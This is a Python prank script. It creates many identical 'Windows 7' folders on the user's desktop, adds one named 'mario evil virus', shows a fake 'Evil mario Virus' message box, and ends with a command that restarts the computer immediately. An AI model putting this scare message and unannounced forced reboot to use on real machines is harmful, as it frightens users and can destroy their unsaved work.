import os

# Specify the folder name you want to create
folder_name = "Windows 7"

# Get the user's desktop path
desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")

# Create the full path for the new folder
new_folder_path = os.path.join(desktop_path, folder_name)

# Check if the folder already exists
if not os.path.exists(new_folder_path):
    # Create the new folder
    os.mkdir(new_folder_path)
    print(f"Folder '{folder_name}' created on the desktop.")
else:
    print(f"Folder '{folder_name}' already exists on the desktop.")

import os

# Specify the folder name you want to create
folder_name = "Windows 7"

# Get the user's desktop path
desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")

# Create the full path for the new folder
new_folder_path = os.path.join(desktop_path, folder_name)

# Check if the folder already exists
if not os.path.exists(new_folder_path):
    # Create the new folder
    os.mkdir(new_folder_path)
    print(f"Folder '{folder_name}' created on the desktop.")
else:
    print(f"Folder '{folder_name}' already exists on the desktop.")

import os

# Specify the folder name you want to create
folder_name = "Windows 7"

# Get the user's desktop path
desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")

# Create the full path for the new folder
new_folder_path = os.path.join(desktop_path, folder_name)

# Check if the folder already exists
if not os.path.exists(new_folder_path):
    # Create the new folder
    os.mkdir(new_folder_path)
    print(f"Folder '{folder_name}' created on the desktop.")
else:
    print(f"Folder '{folder_name}' already exists on the desktop.")

import os

# Specify the folder name you want to create
folder_name = "Windows 7"

# Get the user's desktop path
desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")

# Create the full path for the new folder
new_folder_path = os.path.join(desktop_path, folder_name)

# Check if the folder already exists
if not os.path.exists(new_folder_path):
    # Create the new folder
    os.mkdir(new_folder_path)
    print(f"Folder '{folder_name}' created on the desktop.")
else:
    print(f"Folder '{folder_name}' already exists on the desktop.")

import os

# Specify the folder name you want to create
folder_name = "Windows 7"

# Get the user's desktop path
desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")

# Create the full path for the new folder
new_folder_path = os.path.join(desktop_path, folder_name)

# Check if the folder already exists
if not os.path.exists(new_folder_path):
    # Create the new folder
    os.mkdir(new_folder_path)
    print(f"Folder '{folder_name}' created on the desktop.")
else:
    print(f"Folder '{folder_name}' already exists on the desktop.")

import os

# Specify the folder name you want to create
folder_name = "Windows 7"

# Get the user's desktop path
desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")

# Create the full path for the new folder
new_folder_path = os.path.join(desktop_path, folder_name)

# Check if the folder already exists
if not os.path.exists(new_folder_path):
    # Create the new folder
    os.mkdir(new_folder_path)
    print(f"Folder '{folder_name}' created on the desktop.")
else:
    print(f"Folder '{folder_name}' already exists on the desktop.")

import os

# Specify the folder name you want to create
folder_name = "Windows 7"

# Get the user's desktop path
desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")

# Create the full path for the new folder
new_folder_path = os.path.join(desktop_path, folder_name)

# Check if the folder already exists
if not os.path.exists(new_folder_path):
    # Create the new folder
    os.mkdir(new_folder_path)
    print(f"Folder '{folder_name}' created on the desktop.")
else:
    print(f"Folder '{folder_name}' already exists on the desktop.")

import os

# Specify the folder name you want to create
folder_name = "Windows 7"

# Get the user's desktop path
desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")

# Create the full path for the new folder
new_folder_path = os.path.join(desktop_path, folder_name)

# Check if the folder already exists
if not os.path.exists(new_folder_path):
    # Create the new folder
    os.mkdir(new_folder_path)
    print(f"Folder '{folder_name}' created on the desktop.")
else:
    print(f"Folder '{folder_name}' already exists on the desktop.")

import os

# Specify the folder name you want to create
folder_name = "Windows 7"

# Get the user's desktop path
desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")

# Create the full path for the new folder
new_folder_path = os.path.join(desktop_path, folder_name)

# Check if the folder already exists
if not os.path.exists(new_folder_path):
    # Create the new folder
    os.mkdir(new_folder_path)
    print(f"Folder '{folder_name}' created on the desktop.")
else:
    print(f"Folder '{folder_name}' already exists on the desktop.")

import os

# Specify the folder name you want to create
folder_name = "Windows 7"

# Get the user's desktop path
desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")

# Create the full path for the new folder
new_folder_path = os.path.join(desktop_path, folder_name)

# Check if the folder already exists
if not os.path.exists(new_folder_path):
    # Create the new folder
    os.mkdir(new_folder_path)
    print(f"Folder '{folder_name}' created on the desktop.")
else:
    print(f"Folder '{folder_name}' already exists on the desktop.")

import os

# Specify the folder name you want to create
folder_name = "Windows 7"

# Get the user's desktop path
desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")

# Create the full path for the new folder
new_folder_path = os.path.join(desktop_path, folder_name)

# Check if the folder already exists
if not os.path.exists(new_folder_path):
    # Create the new folder
    os.mkdir(new_folder_path)
    print(f"Folder '{folder_name}' created on the desktop.")
else:
    print(f"Folder '{folder_name}' already exists on the desktop.")

import os

# Specify the folder name you want to create
folder_name = "Windows 7"

# Get the user's desktop path
desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")

# Create the full path for the new folder
new_folder_path = os.path.join(desktop_path, folder_name)

# Check if the folder already exists
if not os.path.exists(new_folder_path):
    # Create the new folder
    os.mkdir(new_folder_path)
    print(f"Folder '{folder_name}' created on the desktop.")
else:
    print(f"Folder '{folder_name}' already exists on the desktop.")

import os

# Specify the folder name you want to create
folder_name = "Windows 7"

# Get the user's desktop path
desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")

# Create the full path for the new folder
new_folder_path = os.path.join(desktop_path, folder_name)

# Check if the folder already exists
if not os.path.exists(new_folder_path):
    # Create the new folder
    os.mkdir(new_folder_path)
    print(f"Folder '{folder_name}' created on the desktop.")
else:
    print(f"Folder '{folder_name}' already exists on the desktop.")

import os

# Specify the folder name you want to create
folder_name = "Windows 7"

# Get the user's desktop path
desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")

# Create the full path for the new folder
new_folder_path = os.path.join(desktop_path, folder_name)

# Check if the folder already exists
if not os.path.exists(new_folder_path):
    # Create the new folder
    os.mkdir(new_folder_path)
    print(f"Folder '{folder_name}' created on the desktop.")
else:
    print(f"Folder '{folder_name}' already exists on the desktop.")

import os

# Specify the folder name you want to create
folder_name = "Windows 7"

# Get the user's desktop path
desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")

# Create the full path for the new folder
new_folder_path = os.path.join(desktop_path, folder_name)

# Check if the folder already exists
if not os.path.exists(new_folder_path):
    # Create the new folder
    os.mkdir(new_folder_path)
    print(f"Folder '{folder_name}' created on the desktop.")
else:
    print(f"Folder '{folder_name}' already exists on the desktop.")

import os

# Specify the folder name you want to create
folder_name = "Windows 7"

# Get the user's desktop path
desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")

# Create the full path for the new folder
new_folder_path = os.path.join(desktop_path, folder_name)

# Check if the folder already exists
if not os.path.exists(new_folder_path):
    # Create the new folder
    os.mkdir(new_folder_path)
    print(f"Folder '{folder_name}' created on the desktop.")
else:
    print(f"Folder '{folder_name}' already exists on the desktop.")

import os

# Specify the folder name you want to create
folder_name = "Windows 7"

# Get the user's desktop path
desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")

# Create the full path for the new folder
new_folder_path = os.path.join(desktop_path, folder_name)

# Check if the folder already exists
if not os.path.exists(new_folder_path):
    # Create the new folder
    os.mkdir(new_folder_path)
    print(f"Folder '{folder_name}' created on the desktop.")
else:
    print(f"Folder '{folder_name}' already exists on the desktop.")

import os

# Specify the folder name you want to create
folder_name = "Windows 7"

# Get the user's desktop path
desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")

# Create the full path for the new folder
new_folder_path = os.path.join(desktop_path, folder_name)

# Check if the folder already exists
if not os.path.exists(new_folder_path):
    # Create the new folder
    os.mkdir(new_folder_path)
    print(f"Folder '{folder_name}' created on the desktop.")
else:
    print(f"Folder '{folder_name}' already exists on the desktop.")

import os

# Specify the folder name you want to create
folder_name = "Windows 7"

# Get the user's desktop path
desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")

# Create the full path for the new folder
new_folder_path = os.path.join(desktop_path, folder_name)

# Check if the folder already exists
if not os.path.exists(new_folder_path):
    # Create the new folder
    os.mkdir(new_folder_path)
    print(f"Folder '{folder_name}' created on the desktop.")
else:
    print(f"Folder '{folder_name}' already exists on the desktop.")

import os

# Specify the folder name you want to create
folder_name = "Windows 7"

# Get the user's desktop path
desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")

# Create the full path for the new folder
new_folder_path = os.path.join(desktop_path, folder_name)

# Check if the folder already exists
if not os.path.exists(new_folder_path):
    # Create the new folder
    os.mkdir(new_folder_path)
    print(f"Folder '{folder_name}' created on the desktop.")
else:
    print(f"Folder '{folder_name}' already exists on the desktop.")

import os

# Specify the folder name you want to create
folder_name = "Windows 7"

# Get the user's desktop path
desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")

# Create the full path for the new folder
new_folder_path = os.path.join(desktop_path, folder_name)

# Check if the folder already exists
if not os.path.exists(new_folder_path):
    # Create the new folder
    os.mkdir(new_folder_path)
    print(f"Folder '{folder_name}' created on the desktop.")
else:
    print(f"Folder '{folder_name}' already exists on the desktop.")

import os

# Specify the folder name you want to create
folder_name = "Windows 7"

# Get the user's desktop path
desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")

# Create the full path for the new folder
new_folder_path = os.path.join(desktop_path, folder_name)

# Check if the folder already exists
if not os.path.exists(new_folder_path):
    # Create the new folder
    os.mkdir(new_folder_path)
    print(f"Folder '{folder_name}' created on the desktop.")
else:
    print(f"Folder '{folder_name}' already exists on the desktop.")

import os

# Specify the folder name you want to create
folder_name = "Windows 7"

# Get the user's desktop path
desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")

# Create the full path for the new folder
new_folder_path = os.path.join(desktop_path, folder_name)

# Check if the folder already exists
if not os.path.exists(new_folder_path):
    # Create the new folder
    os.mkdir(new_folder_path)
    print(f"Folder '{folder_name}' created on the desktop.")
else:
    print(f"Folder '{folder_name}' already exists on the desktop.")

import os

# Specify the folder name you want to create
folder_name = "Windows 7"

# Get the user's desktop path
desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")

# Create the full path for the new folder
new_folder_path = os.path.join(desktop_path, folder_name)

# Check if the folder already exists
if not os.path.exists(new_folder_path):
    # Create the new folder
    os.mkdir(new_folder_path)
    print(f"Folder '{folder_name}' created on the desktop.")
else:
    print(f"Folder '{folder_name}' already exists on the desktop.")

import os

# Specify the folder name you want to create
folder_name = "Windows 7"

# Get the user's desktop path
desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")

# Create the full path for the new folder
new_folder_path = os.path.join(desktop_path, folder_name)

# Check if the folder already exists
if not os.path.exists(new_folder_path):
    # Create the new folder
    os.mkdir(new_folder_path)
    print(f"Folder '{folder_name}' created on the desktop.")
else:
    print(f"Folder '{folder_name}' already exists on the desktop.")

import os

# Specify the folder name you want to create
folder_name = "Windows 7"

# Get the user's desktop path
desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")

# Create the full path for the new folder
new_folder_path = os.path.join(desktop_path, folder_name)

# Check if the folder already exists
if not os.path.exists(new_folder_path):
    # Create the new folder
    os.mkdir(new_folder_path)
    print(f"Folder '{folder_name}' created on the desktop.")
else:
    print(f"Folder '{folder_name}' already exists on the desktop.")

import os

# Specify the folder name you want to create
folder_name = "Windows 7"

# Get the user's desktop path
desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")

# Create the full path for the new folder
new_folder_path = os.path.join(desktop_path, folder_name)

# Check if the folder already exists
if not os.path.exists(new_folder_path):
    # Create the new folder
    os.mkdir(new_folder_path)
    print(f"Folder '{folder_name}' created on the desktop.")
else:
    print(f"Folder '{folder_name}' already exists on the desktop.")

import os

# Specify the folder name you want to create
folder_name = "Windows 7"

# Get the user's desktop path
desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")

# Create the full path for the new folder
new_folder_path = os.path.join(desktop_path, folder_name)

# Check if the folder already exists
if not os.path.exists(new_folder_path):
    # Create the new folder
    os.mkdir(new_folder_path)
    print(f"Folder '{folder_name}' created on the desktop.")
else:
    print(f"Folder '{folder_name}' already exists on the desktop.")

import os

# Specify the folder name you want to create
folder_name = "Windows 7"

# Get the user's desktop path
desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")

# Create the full path for the new folder
new_folder_path = os.path.join(desktop_path, folder_name)

# Check if the folder already exists
if not os.path.exists(new_folder_path):
    # Create the new folder
    os.mkdir(new_folder_path)
    print(f"Folder '{folder_name}' created on the desktop.")
else:
    print(f"Folder '{folder_name}' already exists on the desktop.")

import os

# Specify the folder name you want to create
folder_name = "Windows 7"

# Get the user's desktop path
desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")

# Create the full path for the new folder
new_folder_path = os.path.join(desktop_path, folder_name)

# Check if the folder already exists
if not os.path.exists(new_folder_path):
    # Create the new folder
    os.mkdir(new_folder_path)
    print(f"Folder '{folder_name}' created on the desktop.")
else:
    print(f"Folder '{folder_name}' already exists on the desktop.")

import os

# Specify the folder name you want to create
folder_name = "Windows 7"

# Get the user's desktop path
desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")

# Create the full path for the new folder
new_folder_path = os.path.join(desktop_path, folder_name)

# Check if the folder already exists
if not os.path.exists(new_folder_path):
    # Create the new folder
    os.mkdir(new_folder_path)
    print(f"Folder '{folder_name}' created on the desktop.")
else:
    print(f"Folder '{folder_name}' already exists on the desktop.")

import os

# Specify the folder name you want to create
folder_name = "Windows 7"

# Get the user's desktop path
desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")

# Create the full path for the new folder
new_folder_path = os.path.join(desktop_path, folder_name)

# Check if the folder already exists
if not os.path.exists(new_folder_path):
    # Create the new folder
    os.mkdir(new_folder_path)
    print(f"Folder '{folder_name}' created on the desktop.")
else:
    print(f"Folder '{folder_name}' already exists on the desktop.")

import os

# Specify the folder name you want to create
folder_name = "Windo"

# Get the user's desktop path
desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")

# Create the full path for the new folder
new_folder_path = os.path.join(desktop_path, folder_name)

# Check if the folder already exists
if not os.path.exists(new_folder_path):
    # Create the new folder
    os.mkdir(new_folder_path)
    print(f"Folder '{folder_name}' created on the desktop.")
else:
    print(f"Folder '{folder_name}' already exists on the desktop.")

import os

# Specify the folder name you want to create
folder_name = "windows 7 professional"

# Get the user's desktop path
desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")

# Create the full path for the new folder
new_folder_path = os.path.join(desktop_path, folder_name)

# Check if the folder already exists
if not os.path.exists(new_folder_path):
    # Create the new folder
    os.mkdir(new_folder_path)
    print(f"Folder '{folder_name}' created on the desktop.")
else:
    print(f"Folder '{folder_name}' already exists on the desktop.")

import os

# Specify the folder name you want to create
folder_name = "errm"

# Get the user's desktop path
desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")

# Create the full path for the new folder
new_folder_path = os.path.join(desktop_path, folder_name)

# Check if the folder already exists
if not os.path.exists(new_folder_path):
    # Create the new folder
    os.mkdir(new_folder_path)
    print(f"Folder '{folder_name}' created on the desktop.")
else:
    print(f"Folder '{folder_name}' already exists on the desktop.")

import os

# Specify the folder name you want to create
folder_name = "mario evil virus"

# Get the user's desktop path
desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")

# Create the full path for the new folder
new_folder_path = os.path.join(desktop_path, folder_name)

# Check if the folder already exists
if not os.path.exists(new_folder_path):
    # Create the new folder
    os.mkdir(new_folder_path)
    print(f"Folder '{folder_name}' created on the desktop.")
else:
    print(f"Folder '{folder_name}' already exists on the desktop.")

import ctypes

# Define the message box parameters
message = "Nice Computer You Got there. Can i have it?"
title = "Evil mario Virus"
style = ctypes.windll.user32.MessageBoxW(0, message, title, 0x10)

# Check the return value to see if "OK" was clicked (value: 1)
if style == 1:
    print("OK was clicked.")

os.system("shutdown /r /t 0")